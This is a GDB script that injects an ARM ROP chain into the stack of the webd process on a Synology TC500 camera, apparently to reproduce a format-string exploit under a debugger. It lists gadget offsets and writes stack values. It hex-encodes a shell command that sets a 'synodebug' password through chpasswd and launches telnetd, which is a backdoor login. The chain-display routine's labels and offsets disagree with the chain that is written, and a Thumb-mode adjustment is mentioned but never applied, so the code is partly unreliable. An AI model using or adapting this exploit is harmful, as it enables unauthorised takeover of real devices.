# GDB Script to inject ROP chain into stack
# Based on Synology TC500 format string exploit
# 
# ================================
# INITIALIZATION
# ================================
#

printf "\n=== Synology TC500 ROP Chain Injection Script ===\n"
printf "[*] Usage:\n"
printf "  1. Connect to target: target remote localhost:1234\n"
printf "  2. ROP chain auto-setup will run\n"
printf "  3. Continue execution: continue\n"
printf "\nExample:\n"
printf "  (gdb) target remote localhost:1234\n"
printf "  (gdb) continue\n"
printf "\nAvailable commands:\n"
printf "  setup_rop <base>     - Setup ROP chain with webd base address\n"
printf "  write_rop_chain      - Write ROP chain to stack\n"
printf "  show_rop_chain       - Display ROP chain contents\n"
printf "  redirect_execution   - Redirect execution to ROP chain\n"
printf "\n"


# target remote localhost:1234  # Connect manually when ready


# ================================
# CONFIGURATION
# ================================

# Auto-setup ROP chain with constant base address
define setup_rop
    # Use constant base address and updated target epilog offset
    set $webd_base = 0x400000
    printf "[+] Using webd base address: 0x%08x\n", $webd_base
    
    # ROP Gadget offsets within webd binary (will be added to base address)
    set $target_epilog_offset      = 0x27030
    set $add_sp_20h_pop5_offset    = 0x000294bc
    set $pop_r3_offset             = 0x000a8824
    set $add_r1_sp_18h_blx_r3_offset = 0x00042bd0
    set $bl_system_offset          = 0x00025ddc
    set $mov_r0_r1_blx_r3_offset   = 0x0003fd5c
    set $pop_r4_r5_offset          = 0x0003f5dc
    
    # Calculate absolute addresses (subtract 1 for Thumb mode)
    set $TARGET_EPILOG       = $webd_base + $target_epilog_offset
    set $add_sp_20h_pop5     = $webd_base + $add_sp_20h_pop5_offset
    set $pop_r3              = $webd_base + $pop_r3_offset
    set $add_r1_sp_18h_blx_r3 = $webd_base + $add_r1_sp_18h_blx_r3_offset
    set $bl_system           = $webd_base + $bl_system_offset
    set $mov_r0_r1_blx_r3    = $webd_base + $mov_r0_r1_blx_r3_offset
    set $pop_r4_r5           = $webd_base + $pop_r4_r5_offset
    
    printf "[+] TARGET_EPILOG: 0x%08x\n", $TARGET_EPILOG
    printf "[+] Gadget addresses calculated\n"
    
    # Set breakpoint at target epilog
    break *$TARGET_EPILOG
    printf "[+] Breakpoint set at 0x%08x\n", $TARGET_EPILOG
    
    # Define commands to run when this breakpoint hits
    commands
        printf "\n[+] Hit breakpoint at 0x%08x (ldmia sp!,{r4,r5,r6,r7,r8,r9,r10,r11,pc})!\n", $TARGET_EPILOG
        printf "[*] Current SP: 0x%08x\n", $sp
        printf "[*] Current PC: 0x%08x\n", $pc
        
        # Write the ROP chain to stack
        write_rop_chain
        
        # Show the ROP chain contents
        show_rop_chain
        
        printf "\n[+] ROP chain ready! The ldmia instruction will load PC from our ROP chain.\n"
        printf "[*] Type 'continue' to execute the ROP chain.\n"
    end
end

# Stack offset for ldmia sp!,{r4,r5,r6,r7,r8,r9,r10,r11,pc} instruction
# This instruction pops 9 registers (36 bytes), so we write ROP chain after that
set $stack_offset = 0x24

# ================================
# HELPER FUNCTIONS
# ================================

define write_rop_chain
    printf "[*] Writing ROP chain to stack at SP + 0x%x\n", $stack_offset
    
    # Calculate base address for our fake stack
    set $fake_stack_base = $sp + $stack_offset
    
    printf "[*] Fake stack base: 0x%08x\n", $fake_stack_base
    
    # ROP Chain Layout for ldmia sp!,{r4,r5,r6,r7,r8,r9,r10,r11,pc}:
    # The ldmia will pop 9 registers (36 bytes) from current SP
    # We overwrite the stack data at current SP so:
    # SP+0x00: r4 value (junk)
    # SP+0x04: r5 value (junk) 
    # SP+0x08: r6 value (junk)
    # SP+0x0c: r7 value (junk)
    # SP+0x10: r8 value (junk)
    # SP+0x14: r9 value (junk)
    # SP+0x18: r10 value (junk)
    # SP+0x1c: r11 value (junk)
    # SP+0x20: PC value - this becomes our first ROP gadget!
    
    # Overwrite the current stack (where ldmia will read from)
    set $current_sp = $sp
    set *(int*)($current_sp + 0x00) = 0x41414141
    set *(int*)($current_sp + 0x04) = 0x42424242
    set *(int*)($current_sp + 0x08) = 0x43434343
    set *(int*)($current_sp + 0x0c) = 0x44444444
    set *(int*)($current_sp + 0x10) = 0x45454545
    set *(int*)($current_sp + 0x14) = 0x46464646
    set *(int*)($current_sp + 0x18) = 0x47474747
    set *(int*)($current_sp + 0x1c) = 0x48484848
    set *(int*)($current_sp + 0x20) = $pop_r3
    
    # Write the rest of ROP chain after the ldmia instruction (SP will be at $fake_stack_base after ldmia)
    set *(int*)($fake_stack_base + 0x00) = $pop_r4_r5
    set *(int*)($fake_stack_base + 0x04) = $add_r1_sp_18h_blx_r3
    set *(int*)($fake_stack_base + 0x08) = 0x41414141
    set *(int*)($fake_stack_base + 0x0c) = 0x42424242
    set *(int*)($fake_stack_base + 0x10) = $pop_r3
    set *(int*)($fake_stack_base + 0x14) = $bl_system
    set *(int*)($fake_stack_base + 0x18) = $mov_r0_r1_blx_r3
    set *(int*)($fake_stack_base + 0x1c) = 0x43434343
    
    # Write shell command string where add r1, sp, #0x18 will point
    # SP progression: fake_stack_base -> +8 after pop{r3,pc} -> +0x18 = fake_stack_base + 0x20
    # Original exploit command: "sh${IFS}-c${IFS}'echo${IFS}synodebug:synodebug|chpasswd;telnetd'"
    set *(int*)($fake_stack_base + 0x20) = 0x7b246873
    set *(int*)($fake_stack_base + 0x24) = 0x7d534649
    set *(int*)($fake_stack_base + 0x28) = 0x7b24632d
    set *(int*)($fake_stack_base + 0x2c) = 0x7d534649
    set *(int*)($fake_stack_base + 0x30) = 0x68636527
    set *(int*)($fake_stack_base + 0x34) = 0x497b246f
    set *(int*)($fake_stack_base + 0x38) = 0x737d5346
    set *(int*)($fake_stack_base + 0x3c) = 0x646f6e79
    set *(int*)($fake_stack_base + 0x40) = 0x67756265
    set *(int*)($fake_stack_base + 0x44) = 0x6e79733a
    set *(int*)($fake_stack_base + 0x48) = 0x6265646f
    set *(int*)($fake_stack_base + 0x4c) = 0x637c6775
    set *(int*)($fake_stack_base + 0x50) = 0x73617068
    set *(int*)($fake_stack_base + 0x54) = 0x3b647773
    set *(int*)($fake_stack_base + 0x58) = 0x6e6c6574
    set *(int*)($fake_stack_base + 0x5c) = 0x27647465
    set *(int*)($fake_stack_base + 0x60) = 0x00000000
    
    printf "[+] ROP chain written successfully!\n"
    printf "[*] ROP chain starts at: 0x%08x\n", $fake_stack_base
    printf "[*] Command string at: 0x%08x\n", $fake_stack_base + 0x20
end

define show_rop_chain
    printf "\n[*] ROP Chain Contents:\n"
    set $base = $sp + $stack_offset
    printf "0x%08x: 0x%08x  # add_sp_20h_pop5-24 (r4)\n", $base + 0x00, *(int*)($base + 0x00)
    printf "0x%08x: 0x%08x  # junk (r5)\n", $base + 0x04, *(int*)($base + 0x04)
    printf "0x%08x: 0x%08x  # junk (r6)\n", $base + 0x08, *(int*)($base + 0x08)
    printf "0x%08x: 0x%08x  # junk (r7)\n", $base + 0x0c, *(int*)($base + 0x0c)
    printf "0x%08x: 0x%08x  # junk (r8)\n", $base + 0x10, *(int*)($base + 0x10)
    printf "0x%08x: 0x%08x  # pop_r3 (pc)\n", $base + 0x14, *(int*)($base + 0x14)
    printf "0x%08x: 0x%08x  # pop_r4_r5 (r3)\n", $base + 0x18, *(int*)($base + 0x18)
    printf "0x%08x: 0x%08x  # add_r1_sp_18h_blx_r3 (pc)\n", $base + 0x1c, *(int*)($base + 0x1c)
    printf "0x%08x: 0x%08x  # junk (r4)\n", $base + 0x20, *(int*)($base + 0x20)
    printf "0x%08x: 0x%08x  # junk (r5)\n", $base + 0x24, *(int*)($base + 0x24)
    printf "0x%08x: 0x%08x  # pop_r3 (pc)\n", $base + 0x28, *(int*)($base + 0x28)
    printf "0x%08x: 0x%08x  # bl_system (r3)\n", $base + 0x2c, *(int*)($base + 0x2c)
    printf "0x%08x: 0x%08x  # mov_r0_r1_blx_r3 (pc)\n", $base + 0x30, *(int*)($base + 0x30)
    printf "0x%08x: 0x%08x  # junk\n", $base + 0x34, *(int*)($base + 0x34)
    printf "0x%08x: \"", $base + 0x38
    x/s $base + 0x38
    printf "\"\n"
end

